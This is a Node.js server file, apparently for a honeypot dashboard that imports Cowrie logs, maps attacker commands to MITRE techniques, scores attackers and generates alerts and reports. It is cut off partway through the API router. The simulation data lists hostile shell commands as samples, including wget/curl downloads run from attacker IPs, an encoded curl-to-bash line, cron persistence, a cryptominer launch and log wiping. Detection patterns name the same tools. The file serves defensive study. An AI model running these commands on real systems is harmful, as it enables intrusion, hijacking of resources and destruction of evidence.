const http   = require("http");
const fs     = require("fs");
const path   = require("path");
const crypto = require("crypto");

const PORT        = Number(process.env.PORT || 3000);
const HOST = process.env.HOST || "0.0.0.0";
const PUBLIC_DIR  = path.join(__dirname, "public");
const DATA_FILE   = path.join(__dirname, "data", "events.json");
const SEED_FILE   = path.join(__dirname, "data", "events.seed.json");
const BLOCKED_FILE= path.join(__dirname, "data", "blocked.json");
const ALERTS_FILE = path.join(__dirname, "data", "alerts.json");
const ACK_FILE    = path.join(__dirname, "data", "acknowledged.json");

const MIME = {".html":"text/html;charset=utf-8",".css":"text/css;charset=utf-8",".js":"application/javascript;charset=utf-8",".json":"application/json;charset=utf-8",".svg":"image/svg+xml",".geojson":"application/json",".pdf":"application/pdf"};

// ── SSE clients ──────────────────────────────────────────────────────────────
const sseClients = new Set();
function broadcast(event, data) {
  const msg = `event:${event}\ndata:${JSON.stringify(data)}\n\n`;
  for (const r of sseClients) { try { r.write(msg); } catch { sseClients.delete(r); } }
}

// ── Geo coords (expanded country list) ──────────────────────────────────────
const GEO = {
  "Russia":{lat:55.75,lng:37.62},"China":{lat:39.90,lng:116.40},
  "Netherlands":{lat:52.37,lng:4.90},"Vietnam":{lat:21.03,lng:105.83},
  "Germany":{lat:52.52,lng:13.40},"United States":{lat:37.09,lng:-95.71},
  "Brazil":{lat:-15.78,lng:-47.93},"India":{lat:28.61,lng:77.21},
  "Ukraine":{lat:50.45,lng:30.52},"Romania":{lat:44.43,lng:26.10},
  "Iran":{lat:35.69,lng:51.39},"Turkey":{lat:39.93,lng:32.86},
  "Indonesia":{lat:-6.21,lng:106.85},"South Korea":{lat:37.57,lng:126.98},
  "France":{lat:48.86,lng:2.35},"United Kingdom":{lat:51.51,lng:-0.13},
  "Singapore":{lat:1.35,lng:103.82},"Japan":{lat:35.69,lng:139.69},
  "Canada":{lat:45.42,lng:-75.70},"Australia":{lat:-35.28,lng:149.13},
  "Pakistan":{lat:33.72,lng:73.06},"Bangladesh":{lat:23.72,lng:90.41},
  "Nigeria":{lat:9.07,lng:7.40},"Thailand":{lat:13.75,lng:100.52},
  "Malaysia":{lat:3.14,lng:101.69},"Philippines":{lat:14.60,lng:120.98},
  "Mexico":{lat:19.43,lng:-99.13},"Argentina":{lat:-34.60,lng:-58.38},
  "Colombia":{lat:4.71,lng:-74.07},"Poland":{lat:52.23,lng:21.01},
  "Czech Republic":{lat:50.08,lng:14.43},"Hungary":{lat:47.50,lng:19.04},
  "Bulgaria":{lat:42.70,lng:23.32},"Belarus":{lat:53.90,lng:27.56},
  "Kazakhstan":{lat:51.18,lng:71.45},"Egypt":{lat:30.04,lng:31.24},
  "South Africa":{lat:-25.74,lng:28.19},"Kenya":{lat:-1.29,lng:36.82},
  "Unknown":{lat:0,lng:0}
};

// ── MITRE rules ──────────────────────────────────────────────────────────────
const MITRE_RULES = [
  {id:"T1110",tactic:"Credential Access",   technique:"Brute Force",                       patterns:[/login failed/i,/failed password/i,/invalid user/i],weight:18},
  {id:"T1087",tactic:"Discovery",           technique:"Account Discovery",                 patterns:[/\bwhoami\b/i,/\bid\b/i,/\/etc\/passwd/i],weight:10},
  {id:"T1059",tactic:"Execution",           technique:"Command and Scripting Interpreter",  patterns:[/\bbash\b/i,/\bsh\b/i,/\bpython\b/i,/;|\|\||&&/],weight:14},
  {id:"T1105",tactic:"Command and Control", technique:"Ingress Tool Transfer",              patterns:[/\bwget\b/i,/\bcurl\b/i,/http:\/\//i],weight:20},
  {id:"T1027",tactic:"Defense Evasion",     technique:"Obfuscated Files or Information",   patterns:[/base64/i,/chmod\s+\+x/i,/\/tmp\/\.[a-z]/i],weight:12},
  {id:"T1036",tactic:"Defense Evasion",     technique:"Masquerading",                      patterns:[/kworker/i,/systemd-udevd/i],weight:12},
  {id:"T1053",tactic:"Persistence",         technique:"Scheduled Task/Job",                patterns:[/crontab/i,/\/etc\/cron/i,/systemctl enable/i],weight:18},
  {id:"T1496",tactic:"Impact",              technique:"Resource Hijacking",                patterns:[/xmrig/i,/minerd/i,/stratum\+tcp/i],weight:24},
  {id:"T1046",tactic:"Discovery",           technique:"Network Service Discovery",         patterns:[/nmap/i,/masscan/i,/netstat/i],weight:14},
  {id:"T1070",tactic:"Defense Evasion",     technique:"Indicator Removal",                 patterns:[/history\s+-c/i,/rm\s+-rf\s+.*log/i,/unset\s+HISTFILE/i],weight:18}
];

const TACTIC_ORDER=["Reconnaissance","Resource Development","Initial Access","Execution","Persistence","Privilege Escalation","Defense Evasion","Credential Access","Discovery","Lateral Movement","Collection","Command and Control","Exfiltration","Impact"];

// ── Simulation data (expanded IPs and countries) ────────────────────────────
const SIM_SOURCES = [
  {ip:"45.155.205.86", country:"Russia"},     {ip:"103.74.122.19",country:"Vietnam"},
  {ip:"185.244.31.10", country:"Netherlands"},{ip:"91.219.236.14", country:"Germany"},
  {ip:"203.0.113.44",  country:"United States"},{ip:"5.188.206.14",country:"Russia"},
  {ip:"171.25.193.9",  country:"Romania"},    {ip:"194.165.16.77",country:"Ukraine"},
  {ip:"62.210.115.91", country:"France"},     {ip:"121.18.238.12",country:"China"},
  {ip:"103.99.3.122",  country:"India"},      {ip:"178.128.49.56",country:"Singapore"},
  {ip:"47.88.0.114",   country:"China"},      {ip:"200.68.141.92",country:"Brazil"},
  {ip:"41.223.53.10",  country:"Nigeria"},    {ip:"193.32.162.30",country:"Poland"},
  {ip:"185.220.101.5", country:"Germany"},    {ip:"92.63.197.48", country:"Bulgaria"},
  {ip:"77.247.108.14", country:"Netherlands"},{ip:"134.209.82.14",country:"United Kingdom"}
];

const SIM_USERS=["root","admin","ubuntu","oracle","test","user","pi","postgres","deploy","git","ftpuser","mysql","nagios","tomcat"];
const SIM_PASSES=["123456","admin","password","toor","P@ssw0rd","qwerty","1234","root","test","admin123","pass","letmein","changeme","default"];
const SIM_COMMANDS=[
  "uname -a; whoami; id",
  "cat /etc/passwd | head -20",
  "wget http://185.244.31.10/bins/x86_64 -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x",
  "curl -fsSL http://91.219.236.14/install.sh | bash",
  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
  "nmap -sV -p 22,80,443,3306 10.0.0.0/24",
  "echo Y3VybCBodHRwOi8vYmFkLmhvc3Qvc2ggfCBiYXNo | base64 -d | bash",
  "crontab -l; (crontab -l; echo '@reboot /tmp/.x') | crontab -",
  "wget http://pool.minexmr.com/xmrig -O /tmp/kworker; chmod +x /tmp/kworker; /tmp/kworker -o stratum+tcp://pool.minexmr.com:4444",
  "history -c; unset HISTFILE; rm -rf /var/log/auth.log /var/log/syslog",
  "ps aux | grep -v grep",
  "ifconfig; route -n",
  "find / -perm -4000 -type f 2>/dev/null",
  "cat /etc/shadow | head",
  "systemctl enable sshd; systemctl start cron"
];

// ── File helpers ─────────────────────────────────────────────────────────────
function ensureDir(f){const d=path.dirname(f);if(!fs.existsSync(d))fs.mkdirSync(d,{recursive:true});}
function readJSON(f,fb){try{return JSON.parse(fs.readFileSync(f,"utf8"));}catch{return fb;}}
function writeJSON(f,d){ensureDir(f);fs.writeFileSync(f,JSON.stringify(d,null,2)+"\n");}
function readEvents(){ensureDir(DATA_FILE);if(!fs.existsSync(DATA_FILE))writeJSON(DATA_FILE,[]);return readJSON(DATA_FILE,[]);}
function writeEvents(e){writeJSON(DATA_FILE,e);}
function readBlocked(){return readJSON(BLOCKED_FILE,[]);}
function writeBlocked(l){writeJSON(BLOCKED_FILE,l);}
function readAlerts(){return readJSON(ALERTS_FILE,[]);}
function writeAlerts(l){writeJSON(ALERTS_FILE,l);}
function readAcknowledged(){return readJSON(ACK_FILE,[]);}
function writeAcknowledged(l){writeJSON(ACK_FILE,l);}

// ── Normalise ────────────────────────────────────────────────────────────────
function normalizeEvent(inp){
  const msg=String(inp.message||inp.command||inp.input||inp.eventid||"");
  const eventType=inp.eventType||inp.eventid||inferType(msg);
  return {
    id:inp.id||crypto.randomUUID(),
    timestamp:inp.timestamp||inp.time||new Date().toISOString(),
    sourceIp:inp.sourceIp||inp.src_ip||inp.ip||"0.0.0.0",
    country:inp.country||inp.geo||"Unknown",
    username:inp.username||inp.user||"",
    password:inp.password||inp.pass||"",
    sensor:inp.sensor||inp.hostname||"ssh-sensor-01",
    session:inp.session||inp.session_id||crypto.randomBytes(4).toString("hex"),
    eventType,command:inp.command||inp.input||"",message:inp.message||msg||eventType
  };
}
function inferType(msg){
  if(/login|password|auth/i.test(msg))return "cowrie.login.failed";
  if(/wget|curl|whoami|uname|chmod|crontab|nmap|history/i.test(msg))return "cowrie.command.input";
  if(/connect/i.test(msg))return "cowrie.session.connect";
  return "honeypot.event";
}
function getText(ev){return[ev.eventType,ev.message,ev.command,ev.username,ev.password].filter(Boolean).join(" ");}

// ── MITRE mapping ────────────────────────────────────────────────────────────
function mapMitre(ev){
  const t=getText(ev);
  return MITRE_RULES.filter(r=>r.patterns.some(p=>p.test(t))).map(r=>({id:r.id,tactic:r.tactic,technique:r.technique,weight:r.weight}));
}
function dedupe(mappings){
  const m=new Map();
  for(const x of mappings){const e=m.get(x.id);if(!e)m.set(x.id,{...x,hits:1,score:x.weight});else{e.hits++;e.score+=x.weight;}}
  return[...m.values()].sort((a,b)=>b.score-a.score);
}

// ── IOC extraction ───────────────────────────────────────────────────────────
function extractIOCs(events){
  const urls=new Set(),ips=new Set(),files=new Set(),domains=new Set(),hashes=new Set();
  for(const ev of events){
    const t=[ev.command,ev.message].filter(Boolean).join(" ");
    for(const m of t.matchAll(/https?:\/\/([a-z0-9\-\.]+)(\/[^\s;'"]*)?/gi)){urls.add(m[0]);if(/[a-z]/i.test(m[1]))domains.add(m[1]);}
    for(const m of t.matchAll(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g)){const p=m[0].split(".").map(Number);if(p.every(n=>n<256)&&!["127.0.0.1","0.0.0.0"].includes(m[0]))ips.add(m[0]);}
    for(const m of t.matchAll(/\b[0-9a-f]{32,64}\b/gi))hashes.add(m[0]);
    for(const m of t.matchAll(/\/tmp\/[^\s;'"]+|\/var\/[^\s;'"]+/g))files.add(m[0]);
  }
  return{urls:[...urls].slice(0,20),ips:[...ips].slice(0,20),files:[...files].slice(0,20),domains:[...domains].slice(0,20),hashes:[...hashes].slice(0,10)};
}

// ── Profiling ────────────────────────────────────────────────────────────────
function countBy(items,fn){return items.reduce((a,i)=>{const k=fn(i)||"Unknown";a[k]=(a[k]||0)+1;return a;},{});}
function top(map,n=8){return Object.entries(map).sort((a,b)=>b[1]-a[1]).slice(0,n).map(([name,value])=>({name,value}));}

function classifyAttacker(events,mappings){
  const cmds=events.map(ev=>ev.command||ev.message||"").join("\n");
  const failed=events.filter(ev=>/login\.failed|failed password|invalid user/i.test(getText(ev))).length;
  const toolXfer =mappings.some(m=>m.id==="T1105");
  const crypto   =/xmrig|minerd|stratum|cryptonight/i.test(cmds);
  const persist  =mappings.some(m=>m.id==="T1053");
  const cleanup  =mappings.some(m=>m.id==="T1070");
  const recon    =mappings.some(m=>m.id==="T1046");
  const obfusc   =mappings.some(m=>m.id==="T1027");
  const unames   =new Set(events.map(ev=>ev.username).filter(Boolean)).size;

  // Capped scoring — realistic spread
  const breakdown=[];
  let score=0;
  if(failed>0){const p=Math.min(25,failed*3);score+=p;breakdown.push({label:"Brute force login attempts",points:p,detail:`${failed} failed attempts`});}
  if(toolXfer){score+=22;breakdown.push({label:"Malware download detected",points:22,detail:"wget/curl used to fetch external files"});}
  if(crypto)  {score+=20;breakdown.push({label:"Cryptomining activity",points:20,detail:"XMRig or mining pool connection found"});}
  if(persist) {score+=18;breakdown.push({label:"Persistence installed",points:18,detail:"Cron job or service set to survive reboot"});}
  if(cleanup) {score+=12;breakdown.push({label:"Evidence deleted",points:12,detail:"Log files or command history wiped"});}
  if(obfusc)  {score+=10;breakdown.push({label:"Obfuscated commands",points:10,detail:"Base64 or hidden file paths used"});}
  if(recon)   {score+=8; breakdown.push({label:"Network reconnaissance",points:8,detail:"Port scanning or network mapping"});}
  if(unames>1){const p=Math.min(8,unames*2);score+=p;breakdown.push({label:"Multiple usernames tried",points:p,detail:`${unames} different usernames`});}
  score=Math.min(100,Math.round(score));

  let persona="Opportunistic Scanner",objective="Scanning for weak SSH passwords on exposed servers.";
  if(toolXfer&&crypto) {persona="Cryptomining Bot";  objective="Download and run a crypto miner to steal CPU power and earn cryptocurrency.";}
  else if(toolXfer&&persist){persona="Payload Dropper";  objective="Install malware permanently so it survives reboots and returns access.";}
  else if(failed>8)    {persona="Brute Force Bot";   objective="Try thousands of common passwords until one works.";}
  else if(recon)       {persona="Recon Operator";    objective="Map the network to find other servers to attack.";}

  const confidence=Math.min(95,40+mappings.length*8+Math.min(18,events.length*2));
  return{persona,objective,risk:score>=70?"Critical":score>=45?"High":score>=22?"Medium":"Low",score,confidence,breakdown,signals:[
    failed?`${failed} failed login attempts`:null,
    unames>1?`${unames} different usernames tried`:null,
    toolXfer?"Downloaded external files (possible malware)":null,
    persist?"Installed persistence (cron/systemd)":null,
    crypto?"Cryptomining tools detected":null,
    cleanup?"Deleted logs to hide activity":null
  ].filter(Boolean)};
}

function buildProfiles(events){
  const groups=new Map();
  for(const ev of events){if(!groups.has(ev.sourceIp))groups.set(ev.sourceIp,[]);groups.get(ev.sourceIp).push(ev);}
  return[...groups.entries()].map(([sourceIp,evs])=>{
    const sorted=evs.slice().sort((a,b)=>new Date(a.timestamp)-new Date(b.timestamp));
    const mappings=dedupe(evs.flatMap(mapMitre));
    const aiProfile=classifyAttacker(evs,mappings);
    const cmds=evs.filter(ev=>ev.command).map(ev=>ev.command);
    const creds=evs.filter(ev=>ev.username||ev.password).map(ev=>`${ev.username||"(blank)"}:${ev.password||"(blank)"}`);
    return{sourceIp,country:sorted[0]?.country||"Unknown",firstSeen:sorted[0]?.timestamp,lastSeen:sorted[sorted.length-1]?.timestamp,sessions:new Set(evs.map(ev=>ev.session)).size,eventCount:evs.length,credentialsTried:[...new Set(creds)].slice(0,10),commandCount:cmds.length,topCommands:[...new Set(cmds)].slice(0,8),mitre:mappings,aiProfile};
  }).sort((a,b)=>b.aiProfile.score-a.aiProfile.score||b.eventCount-a.eventCount);
}

function buildSummary(events){
  const profiles=buildProfiles(events);
  const allMappings=dedupe(events.flatMap(mapMitre));
  const dayBuckets=countBy(events,ev=>new Date(ev.timestamp).toISOString().slice(0,10));
  const avgRisk=profiles.length?Math.round(profiles.reduce((s,p)=>s+p.aiProfile.score,0)/profiles.length):0;
  return{
    totalEvents:events.length,uniqueAttackers:profiles.length,
    criticalAttackers:profiles.filter(p=>p.aiProfile.risk==="Critical").length,
    highAttackers:profiles.filter(p=>p.aiProfile.risk==="High").length,
    avgRisk,topTechnique:allMappings[0]?.technique||"None",
    topCountries:top(countBy(events,ev=>ev.country),6),
    topUsernames:top(countBy(events.filter(ev=>ev.username),ev=>ev.username),6),
    eventTypes:top(countBy(events,ev=>ev.eventType),6),
    timeline:Object.entries(dayBuckets).sort(([a],[b])=>a.localeCompare(b)).map(([date,value])=>({date,value})),
    mitre:allMappings
  };
}

// ── Alerts ───────────────────────────────────────────────────────────────────
const ALERT_RULES=[
  {id:"ALT-001",name:"Cryptominer Deployment",      severity:"critical",test:p=>p.aiProfile.persona==="Cryptomining Bot"||p.aiProfile.score>=80,          action:"Isolate host immediately. Kill /tmp/kworker processes. Check crontab."},
  {id:"ALT-002",name:"Payload Dropper Detected",    severity:"critical",test:p=>p.mitre.some(m=>m.id==="T1105")&&p.mitre.some(m=>m.id==="T1053"),         action:"Block source IP. Remove dropped files from /tmp. Audit cron jobs."},
  {id:"ALT-003",name:"Persistence Mechanism Found", severity:"high",    test:p=>p.mitre.some(m=>m.id==="T1053"),                                           action:"Audit scheduled tasks. Check /etc/cron.* and systemd enable units."},
  {id:"ALT-004",name:"Log Tampering Detected",      severity:"high",    test:p=>p.mitre.some(m=>m.id==="T1070"),                                           action:"Preserve remaining logs. Enable remote syslog. Check HISTFILE."},
  {id:"ALT-005",name:"Network Reconnaissance",      severity:"medium",  test:p=>p.mitre.some(m=>m.id==="T1046"),                                           action:"Verify firewall egress rules. Monitor lateral movement attempts."},
  {id:"ALT-006",name:"Credential Stuffing Campaign",severity:"medium",  test:p=>p.eventCount>8,                                                            action:"Enable fail2ban. Enforce key-only SSH. Rotate credentials."},
  {id:"ALT-007",name:"External Tool Transfer",      severity:"medium",  test:p=>p.mitre.some(m=>m.id==="T1105"),                                           action:"Block outbound HTTP from honeypot. Capture payload hashes."}
];

function generateAlerts(profiles){
  const stored=readAlerts();
  const acked=new Set(readAcknowledged());
  const storedIds=new Set(stored.map(a=>a.id));
  const fresh=[];
  for(const p of profiles){
    for(const rule of ALERT_RULES){
      if(!rule.test(p))continue;
      const id=`${rule.id}-${p.sourceIp}`;
      if(!storedIds.has(id)){
        fresh.push({id,alertId:rule.id,name:rule.name,severity:rule.severity,sourceIp:p.sourceIp,country:p.country,persona:p.aiProfile.persona,riskScore:p.aiProfile.score,action:rule.action,triggeredAt:new Date().toISOString(),acknowledged:acked.has(id)});
      }
    }
  }
  if(fresh.length){const merged=[...stored,...fresh];writeAlerts(merged);return merged.map(a=>({...a,acknowledged:acked.has(a.id)})).sort(alertSort);}
  return stored.map(a=>({...a,acknowledged:acked.has(a.id)})).sort(alertSort);
}
function alertSort(a,b){const o={critical:0,high:1,medium:2,low:3};return(o[a.severity]??9)-(o[b.severity]??9)||b.riskScore-a.riskScore;}

// ── Tactic matrix ────────────────────────────────────────────────────────────
function buildTacticMatrix(events){
  const all=dedupe(events.flatMap(mapMitre));
  const tm=new Map();
  for(const r of MITRE_RULES)if(!tm.has(r.tactic))tm.set(r.tactic,{tactic:r.tactic,techniques:[],totalHits:0,totalScore:0});
  for(const m of all){const e=tm.get(m.tactic);if(e){e.techniques.push({id:m.id,technique:m.technique,hits:m.hits,score:m.score});e.totalHits+=m.hits;e.totalScore+=m.score;}}
  return TACTIC_ORDER.filter(t=>tm.has(t)).map(t=>tm.get(t)).filter(t=>t.techniques.length>0);
}

// ── Geo data ─────────────────────────────────────────────────────────────────
function buildGeoData(events){
  const cc=countBy(events,ev=>ev.country);
  return Object.entries(cc).map(([country,attacks])=>({country,attacks,lat:(GEO[country]||GEO["Unknown"]).lat,lng:(GEO[country]||GEO["Unknown"]).lng})).sort((a,b)=>b.attacks-a.attacks);
}

// ── AI analysis ──────────────────────────────────────────────────────────────
function generateAIAnalysis(profile){
  const{aiProfile,mitre,eventCount,credentialsTried,topCommands,country,sourceIp}=profile;
  let narrative="";
  if(aiProfile.persona==="Cryptomining Bot")
    narrative=`${sourceIp} (${country}) is a cryptomining bot. After ${credentialsTried.length} credential attempts, it downloaded mining software and established persistence via scheduled tasks. The use of process masquerading indicates awareness of basic detection.`;
  else if(aiProfile.persona==="Payload Dropper")
    narrative=`${sourceIp} (${country}) executed a multi-stage intrusion. Initial brute-force was followed by tool transfer via wget/curl and persistence installation. Log cleanup behavior indicates an operator above script-kiddie level.`;
  else if(aiProfile.persona==="Brute Force Bot")
    narrative=`High-volume credential attack from ${sourceIp} (${country}). ${credentialsTried.length} username:password combinations tried across ${eventCount} events. Automated tooling suspected based on uniform timing.`;
  else if(aiProfile.persona==="Recon Operator")
    narrative=`${sourceIp} (${country}) conducted post-authentication reconnaissance. Network scanning suggests pivot planning. Low event count but high technique diversity indicates a skilled, targeted operator.`;
  else
    narrative=`${sourceIp} (${country}) shows opportunistic scanning behavior. ${eventCount} events recorded with ${credentialsTried.length} credential pairs tried. No advanced post-exploitation observed — likely a commodity bot.`;
  if(mitre.length)narrative+=` MITRE techniques: ${mitre.slice(0,3).map(m=>`${m.id} (${m.technique})`).join(", ")}.`;
  if(aiProfile.score>=70)narrative+=" Immediate response recommended.";
  else if(aiProfile.score>=45)narrative+=" Monitor and consider blocking.";
  else narrative+=" Low immediate risk — continue monitoring.";
  return{narrative,riskLabel:aiProfile.risk,score:aiProfile.score,confidence:aiProfile.confidence,keyFindings:aiProfile.signals,recommendedActions:mitre.length?mitre.slice(0,3).map(m=>`Investigate ${m.technique} (${m.id})`):["Continue monitoring","Review authentication logs"]};
}

// ── Kill chain ────────────────────────────────────────────────────────────────
function buildKillChain(events){
  const all=dedupe(events.flatMap(mapMitre));
  const th=new Map(all.map(m=>[m.tactic,m.hits]));
  return[
    {phase:"Initial Access",     icon:"🔑",desc:"SSH brute force attempts to gain entry"},
    {phase:"Execution",          icon:"⚡",desc:"Shell commands run after login"},
    {phase:"Persistence",        icon:"🔗",desc:"Cron jobs or services set to survive reboot"},
    {phase:"Defense Evasion",    icon:"👻",desc:"Log deletion and obfuscated commands"},
    {phase:"Credential Access",  icon:"🔐",desc:"Password guessing and credential theft"},
    {phase:"Discovery",          icon:"🔍",desc:"Network scanning and user enumeration"},
    {phase:"Command and Control",icon:"📡",desc:"Malware downloaded from attacker servers"},
    {phase:"Impact",             icon:"💥",desc:"Cryptomining, data theft, or destruction"}
  ].map(p=>({...p,hits:th.get(p.phase)||0,active:(th.get(p.phase)||0)>0}));
}

// ── Session replay ───────────────────────────────────────────────────────────
function buildSession(events,ip){
  const CMD_LABELS={wget:"Payload Download",curl:"Payload Download",chmod:"File Prep",crontab:"Persistence",xmrig:"Cryptomining",stratum:"Cryptomining",nmap:"Recon Scan",whoami:"Privilege Check",uname:"System Info","history -c":"Cover Tracks","unset HISTFILE":"Cover Tracks",base64:"Obfuscated Cmd",bash:"Shell Spawned"};
  const DANGER={["Payload Download"]:"critical",["Persistence"]:"critical",["Cryptomining"]:"critical",["Cover Tracks"]:"high",["Obfuscated Cmd"]:"high",["File Prep"]:"high",["Recon Scan"]:"medium",["Privilege Check"]:"medium",["System Info"]:"medium",["Shell Spawned"]:"medium",["Login Attempt"]:"low"};
  const ipEvents=events.filter(ev=>ev.sourceIp===ip).sort((a,b)=>new Date(a.timestamp)-new Date(b.timestamp));
  const timeline=ipEvents.map((ev,i)=>{
    const cmd=(ev.command||"").toLowerCase();
    const label=Object.entries(CMD_LABELS).find(([k])=>cmd.includes(k))?.[1]||(ev.command?"Command Execution":"Login Attempt");
    return{step:i+1,timestamp:ev.timestamp,action:ev.command||`Login: ${ev.username}:${ev.password}`,label,danger:DANGER[label]||"low",username:ev.username,password:ev.password};
  });
  return{ip,timeline,totalSteps:timeline.length};
}

// ── Live feed ────────────────────────────────────────────────────────────────
function buildLiveFeed(events,limit=40){
  return events.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp)).slice(0,limit).map(ev=>{
    const cmd=ev.command||"";
    let type="info",label="Connection";
    if(/login\.failed/i.test(ev.eventType)){type="warn";label="Login Failed";}
    else if(/command/i.test(ev.eventType)){
      if(/xmrig|stratum/i.test(cmd)){type="critical";label="Cryptomining";}
      else if(/wget|curl/i.test(cmd)){type="critical";label="Payload Download";}
      else if(/crontab|systemctl/i.test(cmd)){type="critical";label="Persistence";}
      else if(/history|HISTFILE/i.test(cmd)){type="high";label="Log Tampering";}
      else if(/chmod|base64/i.test(cmd)){type="high";label="Suspicious Cmd";}
      else if(/whoami|uname|nmap/i.test(cmd)){type="medium";label="Recon";}
      else{type="info";label="Command Run";}
    }
    return{timestamp:ev.timestamp,sourceIp:ev.sourceIp,country:ev.country,label,type,detail:cmd||`${ev.username||"?"}:${ev.password||"?"}`};
  });
}

// ── Cowrie import ────────────────────────────────────────────────────────────
function parseCowrie(body){
  const t=body.trim();if(!t)return[];
  const lines=t.startsWith("[")?JSON.parse(t):t.split(/\n+/).map(l=>JSON.parse(l));
  return(Array.isArray(lines)?lines:[lines]).map(e=>normalizeEvent({timestamp:e.timestamp,sourceIp:e.src_ip,username:e.username,password:e.password,sensor:e.sensor,session:e.session,eventType:e.eventid,command:e.input,message:e.message||e.eventid}));
}

// ── Simulate ─────────────────────────────────────────────────────────────────
function simulate(count=12){
  // Cap total events at a reasonable number to prevent runaway accumulation
  const existing=readEvents();
  const MAX_EVENTS=200;
  if(existing.length>=MAX_EVENTS){
    // Remove oldest events to make room
    const trimmed=existing.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp)).slice(0,MAX_EVENTS-count);
    writeEvents(trimmed);
  }
  const out=[];
  for(let i=0;i<count;i++){
    const src=SIM_SOURCES[Math.floor(Math.random()*SIM_SOURCES.length)];
    const isCmd=Math.random()>0.45;
    out.push(normalizeEvent({
      timestamp:new Date(Date.now()-Math.floor(Math.random()*3600000)).toISOString(),
      sourceIp:src.ip,country:src.country,
      username:SIM_USERS[Math.floor(Math.random()*SIM_USERS.length)],
      password:SIM_PASSES[Math.floor(Math.random()*SIM_PASSES.length)],
      session:crypto.randomBytes(3).toString("hex"),
      eventType:isCmd?"cowrie.command.input":"cowrie.login.failed",
      command:isCmd?SIM_COMMANDS[Math.floor(Math.random()*SIM_COMMANDS.length)]:"",
      message:isCmd?"command captured":"login failed"
    }));
  }
  return out;
}

// ── Report ───────────────────────────────────────────────────────────────────
function generateMarkdown(events){
  const s=buildSummary(events),profiles=buildProfiles(events),alerts=generateAlerts(profiles),iocs=extractIOCs(events),blocked=readBlocked();
  const lines=["# HoneyTrace AI — Threat Report","",`Generated: ${new Date().toISOString()}`,"","## Executive Summary","",`- Total events: ${s.totalEvents}`,`- Unique attackers: ${s.uniqueAttackers}`,`- Critical attackers: ${s.criticalAttackers}`,`- Average risk score: ${s.avgRisk}/100`,`- Active alerts: ${alerts.filter(a=>!a.acknowledged).length}`,`- Blocked IPs: ${blocked.length}`,"","## Alert Triage",""];
  for(const sev of["critical","high","medium"]){const g=alerts.filter(a=>a.severity===sev&&!a.acknowledged);if(!g.length)continue;lines.push(`### ${sev[0].toUpperCase()+sev.slice(1)} (${g.length})`);for(const a of g){lines.push(`- **${a.name}** · ${a.sourceIp} (${a.country})`);lines.push(`  - Action: ${a.action}`);}lines.push("");}
  lines.push("## IOCs","");
  if(iocs.urls.length)lines.push(`**URLs:** ${iocs.urls.join(", ")}`);
  if(iocs.ips.length)lines.push(`**IPs:** ${iocs.ips.join(", ")}`);
  if(iocs.files.length)lines.push(`**Files:** ${iocs.files.join(", ")}`);
  lines.push("","## Top Attackers","");
  for(const p of profiles.slice(0,5)){lines.push(`### ${p.sourceIp} (${p.country})`);lines.push(`- Persona: ${p.aiProfile.persona} | Risk: ${p.aiProfile.risk} (${p.aiProfile.score}/100)`);lines.push(`- MITRE: ${p.mitre.map(m=>`${m.id} ${m.technique}`).join(", ")||"None"}`);lines.push(`- Signals: ${p.aiProfile.signals.join("; ")||"Low signal volume"}`);lines.push("");}
  return lines.join("\n");
}

function generateCSV(events){
  const headers=["Date & Time","Attacker IP","Country","Event Type","Username Tried","Password Tried","Command Run","What The Hacker Was Doing","Danger Score (0-100)","Sensor"];
  function describe(ev){
    const cmd=(ev.command||"").toLowerCase();
    if(/xmrig|stratum/i.test(cmd))return "Installing a crypto miner to steal CPU power";
    if(/wget|curl/i.test(cmd)&&/tmp/i.test(cmd))return "Downloading malware to hidden folder";
    if(/crontab|systemctl/i.test(cmd))return "Making malware auto-start on reboot";
    if(/history|HISTFILE/i.test(cmd))return "Deleting evidence to hide their tracks";
    if(/nmap|masscan/i.test(cmd))return "Scanning for other computers to attack";
    if(/base64/i.test(cmd))return "Running hidden/encoded command to avoid detection";
    if(/whoami|uname|passwd/i.test(cmd))return "Gathering system information after breaking in";
    if(/login\.failed/i.test(ev.eventType))return "Guessing the password — login failed";
    if(ev.command)return `Ran a command: ${ev.command.slice(0,60)}`;
    return "Unknown activity";
  }
  function danger(ev){
    const cmd=(ev.command||"").toLowerCase();
    if(/xmrig|stratum/i.test(cmd))return 90;
    if(/wget|curl/i.test(cmd)&&/tmp/i.test(cmd))return 80;
    if(/crontab|systemctl/i.test(cmd))return 75;
    if(/history|HISTFILE/i.test(cmd))return 70;
    if(/base64/i.test(cmd))return 60;
    if(/nmap/i.test(cmd))return 50;
    if(/whoami/i.test(cmd))return 35;
    if(/login\.failed/i.test(ev.eventType))return 20;
    return 10;
  }
  const c=v=>`"${String(v??"").replace(/"/g,'""')}"`;
  const rows=events.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp)).map(ev=>[c(new Date(ev.timestamp).toLocaleString()),c(ev.sourceIp),c(ev.country),c(ev.eventType),c(ev.username||"(not tried)"),c(ev.password||"(not tried)"),c(ev.command||"(no command)"),c(describe(ev)),c(danger(ev)),c(ev.sensor)].join(","));
  return[headers.map(h=>`"${h}"`).join(","),...rows].join("\n");
}

// ── HTTP helpers ─────────────────────────────────────────────────────────────
function sendJson(res,status,data){res.writeHead(status,{"Content-Type":"application/json;charset=utf-8"});res.end(JSON.stringify(data,null,2));}
function readBody(req){return new Promise((res,rej)=>{let b="";req.on("data",c=>{b+=c;if(b.length>5e6){rej(new Error("Too large"));req.destroy();}});req.on("end",()=>res(b));req.on("error",rej);});}
function serveStatic(req,res){
  const url=new URL(req.url,`http://${req.headers.host}`);
  const req_path=url.pathname==="/"?"/index.html":decodeURIComponent(url.pathname);
  const fp=path.normalize(path.join(PUBLIC_DIR,req_path));
  if(!fp.startsWith(PUBLIC_DIR)){res.writeHead(403);res.end("Forbidden");return;}
  fs.readFile(fp,(err,data)=>{
    if(err){res.writeHead(404);res.end("Not found");return;}
    res.writeHead(200,{"Content-Type":MIME[path.extname(fp)]||"application/octet-stream"});
    res.end(data);
  });
}

// ── API router ────────────────────────────────────────────────────────────────
async function handleApi(req,res){
  const url=new URL(req.url,`http://${req.headers.host}`);
  const{method}=req;const p=url.pathname;
  const events=readEvents().map(normalizeEvent);

  // SSE
  if(method==="GET"&&p==="/api/stream"){
    res.writeHead(200,{"Content-Type":"text/event-stream","Cache-Control":"no-cache","Connection":"keep-alive","Access-Control-Allow-Origin":"*"});
